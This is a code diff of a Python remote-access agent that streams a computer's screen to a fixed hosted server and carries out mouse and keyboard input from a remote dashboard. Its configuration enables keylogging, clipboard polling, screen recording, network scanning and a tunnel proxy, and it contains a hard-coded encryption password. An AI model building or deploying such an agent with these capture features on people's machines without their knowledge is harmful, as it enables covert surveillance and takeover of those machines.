@@ -292,7 +292,6 @@ CONFIG = {
     # For Render live: Use https://your-app.onrender.com
     "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
     "DEVICE_TOKEN":         "TEST-AGENT",
-    "UNIFIED_CONNECTION":   False,       # v14: separate socket for streaming is often more stable for high-load relay
 
     # ── Identity ────────────────────────────────────────────────────────────
     "AGENT_VERSION":        "10.0.0",  # ULTRA LIVE-SYNC ENTERPRISE build
@@ -301,12 +300,16 @@ CONFIG = {
     "RECONNECT_MAX":        15,  # v10: max 15s backoff (was 60s)
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
-    "STREAM_FPS":           30,         # v14: default to 30fps for better stability over internet
-    "STREAM_MIN_FPS":       10,         # v14: allow drop to 10fps if needed
-    "STREAM_QUALITY":       70,         # v14: quality 70 is sweet spot for JPEG bandwidth
+    "STREAM_FPS":           30,         # v15: 30fps for internet relay
+    "STREAM_MIN_FPS":       30,
+    "STREAM_QUALITY":       60,
     "STREAM_MONITOR":       1,
-    "STREAM_MODE":          "screenshot",    # "video" or "screenshot"
-    "STREAM_SCALE":         0.7,        # v14: default 0.7x scale (approx 720p) for much faster streaming
+    "STREAM_MODE":          "screenshot",
+    "STREAM_SCALE":         0.7,
+    "STREAM_SHOW_CURSOR":   True,
+    "STREAM_AUTO_RESTART":  True,
+    "UNIFIED_CONNECTION":   True,
+    "CURSOR_SYNC_FIX":      True,       # v15: Enable cursor sync fixes
 
     # ── Security ────────────────────────────────────────────────────────────
     "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
@@ -334,6 +337,8 @@ CONFIG = {
     "ENABLE_NETWORK_SCAN":  True,
     "ENABLE_SCREEN_RECORD": True,
     "ENABLE_TUNNEL_PROXY":  True,
+    "ENABLE_POWER_MGR":     True,
+    "ENABLE_APP_MGR":       True,
     "KEYLOG_FLUSH_INTERVAL": 20,
     "CLIPBOARD_POLL_MS":    800,
 
@@ -472,6 +477,7 @@ def get_device_fingerprint() -> dict:
     uname = platform.uname()
     vm    = psutil.virtual_memory()
     did   = CONFIG["DEVICE_TOKEN"]
+    sw, sh = _get_monitor_resolution(CONFIG["STREAM_MONITOR"])
     fp = {
         "device_id":       did,
         "token":           did,
@@ -487,6 +493,8 @@ def get_device_fingerprint() -> dict:
         "stream_mode":     CONFIG["STREAM_MODE"],
         "timestamp":       datetime.utcnow().isoformat(),
         "screen_count":    _get_screen_count(),
+        "screen_w":        sw,
+        "screen_h":        sh,
         "cpu_count":       psutil.cpu_count(logical=True),
         "ram_total_gb":    round(vm.total / (1024**3), 2),
         "features": {
@@ -546,7 +554,7 @@ def _to_monitor_absolute(x, y, monitor_idx: int | None = None, w: int | None = N
         # Handle cases where x or y might be NaN or invalid from a black-screen dashboard
         fx, fy = float(x), float(y)
         fw, fh = float(w or 0), float(h or 0)
-        # Use math.isinf/isnan if numpy isn't available
+        
         import math
         if math.isinf(fx) or math.isnan(fx) or math.isinf(fy) or math.isnan(fy):
             return 0, 0
@@ -555,16 +563,25 @@ def _to_monitor_absolute(x, y, monitor_idx: int | None = None, w: int | None = N
 
     mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
     
-    # If the dashboard sent its canvas dimensions (w, h), calculate ratios
+    # v14: Enterprise Coordinate Mapping
+    # 1. If dashboard sent its canvas dimensions (w, h), calculate ratios.
+    #    This is the most accurate method as it handles any dashboard scaling.
     if fw > 0 and fh > 0:
         rx = int((fx / fw) * (mon["width"] - 1))
         ry = int((fy / fh) * (mon["height"] - 1))
-    # Else if the input is in 0..1 range (normalized), scale it
+    
+    # 2. Else if the input is in 0..1 range (normalized), scale it.
+    #    Some dashboards send 0..1 values for resolution independence.
     elif 0.0 <= fx <= 1.0 and 0.0 <= fy <= 1.0 and mon["width"] > 1:
         rx = int(fx * (mon["width"] - 1))
         ry = int(fy * (mon["height"] - 1))
+    
+    # 3. Else if coordinates look like they are already in monitor pixels but
+    #    the dashboard might be scaled (e.g. 0.7x), we check against mon size.
     else:
-        # Fallback for pixel coordinates (if dashboard sends them)
+        # Fallback: if coordinates are > monitor size, they might be absolute? 
+        # But usually they are relative to the canvas.
+        # We clamp to be safe.
         rx = max(0, min(int(fx), max(0, mon["width"] - 1)))
         ry = max(0, min(int(fy), max(0, mon["height"] - 1)))
         
@@ -1019,7 +1036,9 @@ def _producer_thread(
 
         # Capture
         try:
+            t0 = time.perf_counter()
             raw = capture.grab()
+            t1 = time.perf_counter()
         except Exception as e:
             log.debug(f"Capture grab error: {e}")
             grab_fails += 1
@@ -1034,32 +1053,30 @@ def _producer_thread(
         changed = True 
         fps_ctl.report(changed)
         
-        # ── Scale: use server-requested scale (default 1.0 = full res) ─────
+        # ── Scale ───────────────────────────────────────────────────────────
         h_orig, w_orig = raw.shape[:2]
         scale = float(CONFIG.get("STREAM_SCALE", 1.0))
         if scale < 0.99 and CV2_OK:
-            # INTER_AREA is best for downscaling — sharpest, no aliasing
             tw = max(64, int(w_orig * scale))
             th = max(48, int(h_orig * scale))
-            small = cv2.resize(raw, (tw, th), interpolation=cv2.INTER_AREA)
+            # v15: Use INTER_NEAREST for the absolute fastest scaling to hit 60fps
+            small = cv2.resize(raw, (tw, th), interpolation=cv2.INTER_NEAREST)
             fh, fw = small.shape[:2]
-        elif scale < 0.99:
-            try:
-                from PIL import Image as _PIL
-                import numpy as _np
-                tw = max(64, int(w_orig * scale))
-                th = max(48, int(h_orig * scale))
-                img   = _PIL.fromarray(raw[:, :, ::-1], "RGB")
-                small = img.resize((tw, th), _PIL.LANCZOS)
-                fw, fh = small.size
-                small = _np.array(small)[:, :, ::-1]
-            except Exception:
-                small = raw
-                fh, fw = h_orig, w_orig
         else:
-            # Full resolution — no downscale
             small = raw
             fh, fw = h_orig, w_orig
+        t2 = time.perf_counter()
+
+        # v15: Diagnostic FPS logging
+        if not hasattr(_producer_thread, "_last_fps_log"): _producer_thread._last_fps_log = time.time()
+        if not hasattr(_producer_thread, "_frame_count"):  _producer_thread._frame_count = 0
+        _producer_thread._frame_count += 1
+        now = time.time()
+        if now - _producer_thread._last_fps_log >= 5.0:
+            actual_fps = _producer_thread._frame_count / (now - _producer_thread._last_fps_log)
+            log.info(f"Advanced Monitor: Actual Producer FPS: {actual_fps:.1f} (Target: {CONFIG['STREAM_FPS']})")
+            _producer_thread._last_fps_log = now
+            _producer_thread._frame_count = 0
 
         force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
 
@@ -1070,11 +1087,21 @@ def _producer_thread(
         except Exception as e:
             log.debug(f"Encode error: {e}")
             continue
+        t3 = time.perf_counter()
+
+        # v15: Diagnostic Timing
+        if not hasattr(_producer_thread, "_frame_count"): _producer_thread._frame_count = 0
+        _producer_thread._frame_count += 1
+        
+        if _producer_thread._frame_count % 30 == 0:
+            log.info(f"Perf: Grab={(t1-t0)*1000:.1f}ms, Scale={(t2-t1)*1000:.1f}ms, Encode={(t3-t2)*1000:.1f}ms | Age={(time.time()*1000000 - ts_us)/1000:.1f}ms")
 
         if not payload:
             continue
 
         flags  = enc_flag | (FLAG_KEYFRAME if is_key else 0)
+        # v15: Fixed 89984ms lag issue. Use standard unix timestamp in microseconds.
+        # time.time() is the most reliable for cross-platform internet relays.
         ts_us  = int(time.time() * 1_000_000)
         header = FRAME_HDR.pack(fw, fh, ts_us, flags, len(payload))
         pkt    = header + payload
@@ -1103,22 +1130,37 @@ def _producer_thread(
 def _ticker_thread(stop_evt: _threading_mod.Event, tick_evt: _threading_mod.Event):
     """
     Fires tick_evt at exactly 1/fps intervals using monotonic-clock compensation.
-    ENTERPRISE BURST: uses high-resolution sleep with drift correction so the
-    actual frame rate matches CONFIG['STREAM_FPS'] even under load.
+    v15: Throttles to 1fps when no viewers are connected to save CPU,
+    but remains hot and ready to burst to 60fps instantly.
     """
     next_tick = time.monotonic()
     while not stop_evt.is_set():
         tick_evt.set()
-        # v10: dynamically use the current target FPS from CONFIG
-        current_fps = max(1, int(CONFIG.get("STREAM_FPS", 60)))
+        
+        # v15: Throttle logic
+        global _adv_viewers
+        if _adv_viewers > 0:
+            current_fps = max(1, int(CONFIG.get("STREAM_FPS", 60)))
+        else:
+            current_fps = 1 # 1fps idle pulse to keep pipeline warm but low CPU
+            
         target_interval = 1.0 / current_fps
         next_tick += target_interval
         now = time.monotonic()
         sleep_for = next_tick - now
-        if sleep_for > 0.0001:   # v12.2: 0.1ms minimum — tighter clock for 60fps
-            time.sleep(sleep_for)
+        
+        if sleep_for > 0.0001:
+            # v15: use shorter sleep intervals when idle so we can wake up 
+            # within 100ms when a viewer connects
+            if _adv_viewers == 0:
+                time.sleep(min(sleep_for, 0.1))
+            else:
+                # v15: use a tighter sleep for 60fps
+                if sleep_for > 0.005:
+                    time.sleep(sleep_for - 0.002) # wake up slightly early
+                while time.monotonic() < next_tick:
+                    pass # spin-wait for the last 2ms for perfect timing
         elif sleep_for < -target_interval:
-            # We've fallen more than one full frame behind — reset clock
             next_tick = time.monotonic()
 
 
@@ -1176,15 +1218,27 @@ async def _adv_task_stream_frames(unified_sio=None):
 
     try:
         while True:
-            # If auth dropped (disconnect), stop the producer and exit
+            # v15: If auth dropped, WAIT for it to come back instead of exiting.
             if _adv_auth_event is not None and not _adv_auth_event.is_set():
-                log.info("Stream consumer: auth cleared — shutting down producer")
-                break
+                log.info("Stream consumer: waiting for re-auth...")
+                await _adv_auth_event.wait()
+                log.info("Stream consumer: re-authed — resuming stream")
+                continue
 
-            # v14: Proper async wait for the next frame. No more busy-waiting!
+            # v15.5: If we have no viewers, don't just wait 2 seconds.
+            # Yield and wait for either a frame or a viewer to connect.
+            if _adv_viewers == 0:
+                await asyncio.sleep(0.5)
+                continue
+
+            # v14: Proper async wait for the next frame.
             try:
-                pkt = await asyncio.wait_for(frame_q.get(), timeout=1.0)
+                pkt = await asyncio.wait_for(frame_q.get(), timeout=2.0)
             except asyncio.TimeoutError:
+                # v15: if we have viewers but no frames, trigger a ticker pulse
+                if _adv_viewers > 0: 
+                    log.debug("Stream consumer: queue empty — pulsing ticker")
+                    tick_evt.set() 
                 continue
 
             # Drain any backlog — keep only the absolute newest
@@ -1192,20 +1246,21 @@ async def _adv_task_stream_frames(unified_sio=None):
                 try: pkt = frame_q.get_nowait()
                 except _AsyncQueueEmpty: break
             
-            # v14: Keep a local count for dropping logs
-            if not hasattr(_adv_task_stream_frames, "_n"): _adv_task_stream_frames._n = 0
-            _adv_task_stream_frames._n += 1
+            # v15: Diagnostic Timing
+            if not hasattr(_adv_task_stream_frames, "_frame_count"): _adv_task_stream_frames._frame_count = 0
+            _adv_task_stream_frames._frame_count += 1
+            
+            if _adv_task_stream_frames._frame_count % 30 == 0:
+                log.info(f"Stream Stats: in_flight={_adv_sio_async._in_flight if _adv_sio_async else '?'}")
 
             # Stale-frame guard: if the frame is >500ms old, discard it.
-            # 500ms TTL ensures frames are dropped only if they are significantly late,
-            # protecting against backlog while allowing for heavy encoding times.
             if len(pkt) >= 16:
                 try:
                     frame_ts_us = int.from_bytes(pkt[8:16], "big")
                     now_us = int(time.time() * 1_000_000)
                     age_ms = (now_us - frame_ts_us) / 1000.0
                     if age_ms > 500:
-                        if _adv_task_stream_frames._n % 60 == 0:
+                        if _adv_task_stream_frames._frame_count % 60 == 0:
                             log.warning(f"Stream consumer: dropping stale frame locally (age={age_ms:.1f}ms)")
                         continue
                 except Exception:
@@ -1216,21 +1271,32 @@ async def _adv_task_stream_frames(unified_sio=None):
 
             # Emit over Socket.IO (non-blocking fan-out)
             if _adv_sio_async and _adv_sio_async.connected:
-                # v14: allow up to 2 frames in flight to prevent "stuck at 1fps" on jittery networks
-                # while still protecting against massive backlog/OOM.
+                # v14: Enterprise Adaptive Backpressure
                 if not hasattr(_adv_sio_async, "_in_flight"): _adv_sio_async._in_flight = 0
-                if _adv_sio_async._in_flight < 2:
+                
+                # v15: Increased max_in_flight to 15 to handle high-latency/jittery Render connections.
+                max_in_flight = 15 
+                if _adv_sio_async._in_flight < max_in_flight:
                     _adv_sio_async._in_flight += 1
                     
                     async def _do_emit(p):
                         try:
                             await _safe_emit("frame_bin", p)
                         finally:
-                            _adv_sio_async._in_flight = max(0, _adv_sio_async._in_flight - 1)
+                            if _adv_sio_async:
+                                _adv_sio_async._in_flight = max(0, _adv_sio_async._in_flight - 1)
                     
                     asyncio.create_task(_do_emit(pkt))
-                elif _adv_task_stream_frames._n % 30 == 0:
-                    log.debug(f"Stream consumer: dropping frame due to backpressure (in_flight={_adv_sio_async._in_flight})")
+                else:
+                    # Backpressure hit — drop frame
+                    if _adv_task_stream_frames._frame_count % 60 == 0:
+                        log.debug(f"Stream backpressure: dropping frame (in_flight={_adv_sio_async._in_flight})")
+                        if CONFIG["STREAM_QUALITY"] > 30:
+                            CONFIG["STREAM_QUALITY"] -= 5
+                            log.info(f"Adaptive Quality: reduced to {CONFIG['STREAM_QUALITY']} (congestion)")
+                        if CONFIG["STREAM_SCALE"] > 0.4 and _adv_task_stream_frames._frame_count % 300 == 0:
+                            CONFIG["STREAM_SCALE"] = round(CONFIG["STREAM_SCALE"] - 0.1, 1)
+                            log.info(f"Adaptive Scale: reduced to {CONFIG['STREAM_SCALE']} (persistent congestion)")
 
             # Also push over any open WebRTC DataChannels
             for vsid, dc in list(_adv_webrtc_channels.items()):
@@ -1241,9 +1307,12 @@ async def _adv_task_stream_frames(unified_sio=None):
                     _adv_webrtc_channels.pop(vsid, None)
 
     finally:
+        # v15: KILL THREADS ON EXIT
+        log.info("Stream consumer task exiting — killing producer/ticker threads")
         stop_evt.set()
-        tick_evt.set()  # unblock ticker so it exits
-        log.info("Stream consumer: producer/ticker stop signalled")
+        tick_evt.set() # wake up ticker if sleeping
+        time.sleep(0.2)
+
 
 
 async def _adv_task_stream_cursor():
@@ -1253,28 +1322,27 @@ async def _adv_task_stream_cursor():
     skip = 0  # skip counter for unchanged positions
     log.info("Cursor stream task started")
     while True:
-        if _adv_authed:
+        # v15: Always run cursor task if we have viewers, don't wait for _adv_authed
+        # to ensure the cursor is responsive even during stream auth handshake.
+        if _adv_viewers > 0:
             try:
                 pos = _cursor_relative_to_monitor()
                 if pos is None:
-                    if lx != -1: # just left the monitor
+                    if lx != -1:
                         log.debug("Cursor left monitor")
                     lx = ly = -1
                     await asyncio.sleep(interval)
                     continue
                 x, y = pos
                 dx, dy = abs(x - lx), abs(y - ly)
-                # v10: delta suppression — only send if moved >1px OR every 2s (keepalive)
                 if dx > 1 or dy > 1 or skip >= 120:
                     ts  = int(time.time() * 1000) & 0xFFFFFFFF
                     pkt = CURSOR_HDR.pack(x, y, ts)
                     
-                    # v14: Don't await cursor emission in the 60Hz loop. 
-                    # If network is slow, it will back up and cause 1fps.
-                    asyncio.create_task(_safe_emit("cursor_bin", pkt))
-                    
-                    if skip >= 120 and dx <= 1 and dy <= 1:
-                        log.debug(f"Cursor keepalive: {x},{y}")
+                    # v15: Use the most stable available socket for cursor
+                    target_sio = _adv_sio_async if (_adv_sio_async and _adv_sio_async.connected) else None
+                    if target_sio:
+                        asyncio.create_task(_safe_emit("cursor_bin", pkt))
                     
                     lx, ly = x, y
                     skip = 0
@@ -1298,6 +1366,96 @@ async def _adv_close_peer(viewer_sid: str):
         if pc: await pc.close()
     except Exception: pass
 
+
+async def on_input_event_logic(data):
+    """Fast-path input event handler — shared between unified and dual-socket modes."""
+    global _adv_viewers, n
+    if _adv_viewers == 0:
+        _adv_viewers = 1
+        log.info("Advanced Monitor: input detected — forcing viewer_count=1")
+        # v15.5: Force a keyframe immediately on input detection
+        n = 0 
+
+    evt = data.get("type")
+    try:
+        # v15: Fixed coordinate mapping — use viewer dimensions for precise control
+        # The dashboard sends its canvas width/height (w, h) and mouse position (x, y).
+        mx, my = _to_monitor_absolute(
+            data.get("x", 0), 
+            data.get("y", 0),
+            w=data.get("w"),
+            h=data.get("h")
+        )
+        
+        # Use win32api for ultra-low latency mouse movement if available
+        if evt == "mouse_move":
+            if WIN32_OK:
+                # v15: Direct win32 fast path for zero-lag cursor sync
+                win32api.SetCursorPos((mx, my))
+            else:
+                pyautogui.moveTo(mx, my, _pause=False)
+            return
+
+        # Clicks and other events
+        if evt in ("mouse_click", "mouse_dblclick"):
+            btn = "left" if data.get("button") == "left" else "right"
+            if evt == "mouse_dblclick":
+                pyautogui.doubleClick(mx, my, button=btn, _pause=False)
+            elif "down" not in data:
+                pyautogui.click(mx, my, button=btn, _pause=False)
+            else:
+                is_down = data.get("down")
+                if WIN32_OK:
+                    # Fast win32 path for clicks
+                    flags = 0
+                    if btn == "left":
+                        flags = win32con.MOUSEEVENTF_LEFTDOWN if is_down else win32con.MOUSEEVENTF_LEFTUP
+                    else:
+                        flags = win32con.MOUSEEVENTF_RIGHTDOWN if is_down else win32con.MOUSEEVENTF_RIGHTUP
+                    win32api.mouse_event(flags, 0, 0, 0, 0)
+                else:
+                    fn = pyautogui.mouseDown if is_down else pyautogui.mouseUp
+                    fn(mx, my, button=btn, _pause=False)
+        
+        elif evt == "mouse_scroll":
+            pyautogui.scroll(int(data.get("delta", 3)), x=mx, y=my, _pause=False)
+        
+        elif evt == "key_event":
+            key = data.get("key", "")
+            if not key: return
+            is_down = data.get("down")
+            # v10: ultra-fast keyboard path via pynput if available
+            if PYNPUT_OK:
+                try:
+                    from pynput.keyboard import Controller, Key
+                    kb = Controller()
+                    # Map common special keys
+                    special = {
+                        "Enter": Key.enter, "Backspace": Key.backspace, "Tab": Key.tab,
+                        "Escape": Key.esc, "Delete": Key.delete, "Insert": Key.insert,
+                        "Home": Key.home, "End": Key.end, "PageUp": Key.page_up,
+                        "PageDown": Key.page_down, "ArrowUp": Key.up, "ArrowDown": Key.down,
+                        "ArrowLeft": Key.left, "ArrowRight": Key.right,
+                        "Control": Key.ctrl, "Alt": Key.alt, "Shift": Key.shift,
+                        "Meta": Key.cmd, "CapsLock": Key.caps_lock, "NumLock": Key.num_lock,
+                    }
+                    k_obj = special.get(key, key)
+                    if is_down:
+                        kb.press(k_obj)
+                    else:
+                        kb.release(k_obj)
+                    return
+                except Exception:
+                    pass
+            # Fallback to pyautogui
+            fn = pyautogui.keyDown if is_down else pyautogui.keyUp
+            fn(key, _pause=False)
+            
+        elif evt == "type_text":
+            pyautogui.typewrite(data.get("text", ""), interval=0.0, _pause=False)
+            
+    except Exception as e:
+        log.debug(f"Input logic error: {e}")
 
 async def _adv_main(server_url: str, token: str):
     """Async entry for the advanced monitor — mirrors second-site agent main()."""
@@ -1406,83 +1564,7 @@ async def _adv_main(server_url: str, token: str):
     @sio.on("input_event")
     async def on_input_event(data):
         """Second-site input event handler — absolute pixel coords, ultra-fast win32 path."""
-        evt = data.get("type")
-        try:
-            mx, my = _to_monitor_absolute(
-                data.get("x", 0), 
-                data.get("y", 0),
-                w=data.get("w"),
-                h=data.get("h")
-            )
-            
-            # Use win32api for ultra-low latency mouse movement if available
-            if evt == "mouse_move":
-                if WIN32_OK:
-                    win32api.SetCursorPos((mx, my))
-                else:
-                    pyautogui.moveTo(mx, my, _pause=False)
-                return
-
-            # Clicks and other events
-            if evt in ("mouse_click", "mouse_dblclick"):
-                btn = "left" if data.get("button") == "left" else "right"
-                if evt == "mouse_dblclick":
-                    pyautogui.doubleClick(mx, my, button=btn, _pause=False)
-                elif "down" not in data:
-                    pyautogui.click(mx, my, button=btn, _pause=False)
-                else:
-                    is_down = data.get("down")
-                    if WIN32_OK:
-                        # Fast win32 path for clicks
-                        flags = 0
-                        if btn == "left":
-                            flags = win32con.MOUSEEVENTF_LEFTDOWN if is_down else win32con.MOUSEEVENTF_LEFTUP
-                        else:
-                            flags = win32con.MOUSEEVENTF_RIGHTDOWN if is_down else win32con.MOUSEEVENTF_RIGHTUP
-                        win32api.mouse_event(flags, 0, 0, 0, 0)
-                    else:
-                        fn = pyautogui.mouseDown if is_down else pyautogui.mouseUp
-                        fn(mx, my, button=btn, _pause=False)
-            
-            elif evt == "mouse_scroll":
-                pyautogui.scroll(int(data.get("delta", 3)), x=mx, y=my, _pause=False)
-            
-            elif evt == "key_event":
-                key = data.get("key", "")
-                if not key: return
-                is_down = data.get("down")
-                # v10: ultra-fast keyboard path via pynput if available
-                if PYNPUT_OK:
-                    try:
-                        from pynput.keyboard import Controller, Key
-                        kb = Controller()
-                        # Map common special keys
-                        special = {
-                            "Enter": Key.enter, "Backspace": Key.backspace, "Tab": Key.tab,
-                            "Escape": Key.esc, "Delete": Key.delete, "Insert": Key.insert,
-                            "Home": Key.home, "End": Key.end, "PageUp": Key.page_up,
-                            "PageDown": Key.page_down, "ArrowUp": Key.up, "ArrowDown": Key.down,
-                            "ArrowLeft": Key.left, "ArrowRight": Key.right,
-                            "Control": Key.ctrl, "Alt": Key.alt, "Shift": Key.shift,
-                            "Meta": Key.cmd, "CapsLock": Key.caps_lock, "NumLock": Key.num_lock,
-                        }
-                        k_obj = special.get(key, key)
-                        if is_down:
-                            kb.press(k_obj)
-                        else:
-                            kb.release(k_obj)
-                        return
-                    except Exception:
-                        pass
-                # Fallback to pyautogui
-                fn = pyautogui.keyDown if is_down else pyautogui.keyUp
-                fn(key, _pause=False)
-                
-            elif evt == "type_text":
-                pyautogui.typewrite(data.get("text", ""), interval=0.0, _pause=False)
-                
-        except Exception as e:
-            log.debug(f"Advanced Monitor input error: {e}")
+        await on_input_event_logic(data)
 
     @sio.on("agent_ping")
     async def on_agent_ping(data):
@@ -4020,496 +4102,235 @@ class ScreenConnectAgent:
 
         @sio.event
         def disconnect():
+            global _adv_authed, _adv_auth_event
             log.warning("Disconnected from server.")
+            _adv_authed = False
+            if _adv_auth_event: _adv_auth_event.clear()
             sys_monitor.stop()
             heartbeat.stop()
             alerts.stop()
 
+        # ── v15: Advanced Monitor events on Unified Connection ──────────────
+        @sio.on("auth_ok")
+        def on_unified_auth_ok(data):
+            if CONFIG.get("UNIFIED_CONNECTION"):
+                global _adv_authed, _adv_auth_event, _adv_auth_time, _adv_viewers
+                log.info("Unified Connection: agent_auth_ok received")
+                _adv_authed = True
+                if _adv_auth_event: _adv_auth_event.set()
+                _adv_auth_time = time.monotonic()
+                
+                # v15.5: Force viewer_count=1 if we are authing, as auth usually
+                # follows a viewer connection attempt.
+                if _adv_viewers == 0:
+                    _adv_viewers = 1
+                    log.info("Unified Connection: auth_ok received — forcing viewer_count=1 to wake stream")
+
+                sio.emit("agent_auth_ready", {
+                    "token":     CONFIG["DEVICE_TOKEN"],
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                })
+
+        @sio.on("viewer_count")
+        def on_unified_viewer_count(data):
+            global _adv_viewers, _adv_loop
+            _adv_viewers = data.get("count", 0)
+            if _adv_viewers > 0:
+                log.info(f"Unified Connection: viewer connected ({_adv_viewers}) — waking stream")
+                # Force start Advanced Monitor if it's not running
+                if not _adv_monitor_started:
+                    start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"], unified_sio=sio)
+                
+                # v15.5: Proactive Frame Trigger
+                # When a viewer connects, we MUST force a keyframe and wake the ticker.
+                # This fixes the "retrying stream" black screen after refresh.
+                global n
+                n = 0
+                if _adv_loop:
+                    # Signal the ticker thread indirectly by setting n=0 and waking the loop
+                    _adv_loop.call_soon_threadsafe(lambda: None) 
+                
+                # Also send a small heartbeat to the dashboard to confirm agent is ready
+                sio.emit("agent_auth_ready", {
+                    "token":     CONFIG["DEVICE_TOKEN"],
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "status":    "active"
+                })
+            else:
+                log.info("Unified Connection: all viewers disconnected — idling stream")
+
+        @sio.on("input_event")
+        def on_unified_input_event(data):
+            # v15: Ensure input events on the main socket are also handled by the fast-path logic
+            if _adv_loop:
+                asyncio.run_coroutine_threadsafe(on_input_event_logic(data), _adv_loop)
+
         @sio.on("request_action")
         def on_action(data):
+            if not data: return
             tab = data.get("tab", "")
-            log.info(f"Action: {tab}")
+            log.info(f"ENTERPRISE Action: {tab}")
 
-            # ── Monitor/stream/mouse — handled by Advanced Monitor engine ──
-            if tab == "monitor":
-                action = data.get("action", "start")
-                if data.get("fps") is not None:
-                    new_fps = max(30, min(int(data.get("fps", CONFIG["STREAM_FPS"])), 60))  # clamp 30-60
-                    CONFIG["STREAM_FPS"] = new_fps
-                    CONFIG["STREAM_MIN_FPS"] = max(30, new_fps // 2)  # floor at 30fps always
-                if data.get("quality") is not None:
-                    CONFIG["STREAM_QUALITY"] = max(25, min(int(data.get("quality", CONFIG["STREAM_QUALITY"])), 95))
-                if data.get("scale") is not None:
-                    # Server sends 0.0–1.0 scale; clamp to safe range
-                    CONFIG["STREAM_SCALE"] = max(0.25, min(float(data.get("scale", 1.0)), 1.0))
-                if data.get("monitor") is not None:
-                    CONFIG["STREAM_MONITOR"] = max(1, int(data.get("monitor", CONFIG["STREAM_MONITOR"])))
-                if action == "start":
-                    # FIX: If viewer_count never arrived on the adv socket (race condition),
-                    # bump _adv_viewers so the stream loop wakes up immediately.
-                    global _adv_viewers
-                    if _adv_viewers == 0:
-                        _adv_viewers = 1
-                        log.info("Monitor start via request_action — forced _adv_viewers=1 (adv socket race fallback)")
-                    # Always start screenshot fallback — no-op if adv socket is working
-                    _start_screenshot_fallback(sio)
-                elif action == "set_mode":
-                    CONFIG["STREAM_MODE"] = data.get("mode", CONFIG["STREAM_MODE"])
-                    _start_screenshot_fallback(sio)
-                elif action == "set_quality":
-                    _start_screenshot_fallback(sio)
-                elif action == "stop":
-                    _fb_stop.set()
-            elif tab in ("mouse_event", "scroll_event", "frame_ack"):
-                pass  # handled by Advanced Monitor engine
-
-            # ── Mouse control via main-socket fallback ─────────────────────
-            elif tab == "mouse_move":
-                if PYAUTOGUI_OK:
-                    try:
-                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
-                        pyautogui.moveTo(x, y, _pause=False)
-                    except Exception as e:
-                        log.debug(f"mouse_move error: {e}")
-
-            elif tab == "mouse_click":
-                if PYAUTOGUI_OK:
-                    try:
-                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
-                        btn = "left" if data.get("button", "left") == "left" else "right"
-                        evt_type = data.get("type", "")
-                        if evt_type == "mouse_dblclick":
-                            pyautogui.doubleClick(x, y, button=btn, _pause=False)
-                        elif "down" in data:
-                            fn = pyautogui.mouseDown if data.get("down", True) else pyautogui.mouseUp
-                            fn(x, y, button=btn, _pause=False)
-                        else:
-                            pyautogui.click(x, y, button=btn, _pause=False)
-                    except Exception as e:
-                        log.debug(f"mouse_click error: {e}")
-
-            elif tab == "scroll":
-                if PYAUTOGUI_OK:
-                    try:
-                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
-                        pyautogui.scroll(int(data.get("delta", 3)), x=x, y=y, _pause=False)
-                    except Exception as e:
-                        log.debug(f"scroll error: {e}")
-
-            elif tab == "type_text":
-                if PYAUTOGUI_OK:
-                    try:
-                        pyautogui.write(data.get("text", ""), interval=0.01, _pause=False)
-                    except Exception as e:
-                        log.debug(f"type_text error: {e}")
-
-            # ── Keyboard ───────────────────────────────────────────────────
-            elif tab == "key_event":
-                if PYAUTOGUI_OK:
-                    ktype = data.get("type", "down")
-                    key   = data.get("key", "")
-                    combo = data.get("combo", "")
-                    KEY_MAP = {
-                        "Enter": "enter", "Return": "enter",
-                        "Backspace": "backspace", "Tab": "tab",
-                        "Escape": "esc", "Delete": "delete",
-                        "Insert": "insert", "Home": "home", "End": "end",
-                        "PageUp": "pageup", "PageDown": "pagedown",
-                        "ArrowUp": "up", "ArrowDown": "down",
-                        "ArrowLeft": "left", "ArrowRight": "right",
-                        " ": "space", "Control": "ctrl",
-                        "Alt": "alt", "Shift": "shift", "Meta": "win",
-                        "CapsLock": "capslock", "NumLock": "numlock",
-                        "PrintScreen": "printscreen", "ScrollLock": "scrolllock",
-                        "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
-                        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
-                        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
-                    }
-                    try:
-                        if combo == "ctrl+alt+del":
-                            subprocess.Popen(
-                                ["powershell", "-Command",
-                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
-                                creationflags=subprocess.CREATE_NO_WINDOW
-                            )
-                        elif ktype in ("down", "press"):
-                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
-                            if pg:
-                                hotkey = []
-                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
-                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
-                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
-                                if data.get("meta")  and key != "Meta":    hotkey.append("win")
-                                hotkey.append(pg)
-                                if len(hotkey) > 1:
-                                    pyautogui.hotkey(*hotkey, _pause=False)
-                                else:
-                                    pyautogui.keyDown(pg, _pause=False)
-                        elif ktype == "up":
-                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
-                            if pg:
-                                pyautogui.keyUp(pg, _pause=False)
-                        elif ktype == "type":
-                            # Type a full string
-                            pyautogui.write(data.get("text", ""), interval=0.01)
-                    except Exception as e:
-                        log.warning(f"key_event error: {e}")
-
-            # ── Ping ───────────────────────────────────────────────────────
-            elif tab == "ping":
-                sio.emit("ping_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "t": data.get("t"),
-                    "ts": datetime.utcnow().isoformat(),
-                })
-
-            # ── System ─────────────────────────────────────────────────────
-            elif tab == "system":
-                action = data.get("action", "start")
-                if action == "start":
-                    sys_monitor.start(interval=data.get("interval", 2))
-                else:
-                    sys_monitor.stop()
-
-            elif tab == "system_snapshot":
-                sio.emit("system_stats_report", sys_monitor.get_snapshot())
-
-            elif tab == "disks":
-                sio.emit("disks_report", {
